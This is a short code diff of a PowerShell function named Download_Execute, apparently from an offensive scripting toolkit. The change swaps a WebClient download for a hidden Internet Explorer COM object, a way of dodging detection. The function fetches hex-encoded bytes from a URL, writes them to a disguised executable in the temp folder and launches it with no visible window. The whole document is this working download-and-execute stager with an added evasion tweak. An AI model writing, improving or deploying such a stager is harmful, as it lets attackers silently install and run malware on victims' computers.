@@ -28,9 +28,13 @@ function Download_Execute
         $URL
     )
 
-    $webclient = New-Object System.Net.WebClient
-    [string]$hexformat = $webClient.DownloadString($URL) 
+    $webClient = New-Object -ComObject InternetExplorer.Application
+    $webClient.Visible = $false
+    $webClient.Navigate($URL)
+    while($webClient.ReadyState -ne 4) { Start-Sleep -Milliseconds 100 }
+    [string]$hexformat = $webClient.Document.Body.innerText
+    $webClient.Quit()
     [Byte[]] $temp = $hexformat -split ' ' 
-    [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp) 
-    start-process -nonewwindow "$env:temp\svcmondr.exe" 
+    [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp)
+    Start-Process -NoNewWindow "$env:temp\svcmondr.exe"
 }
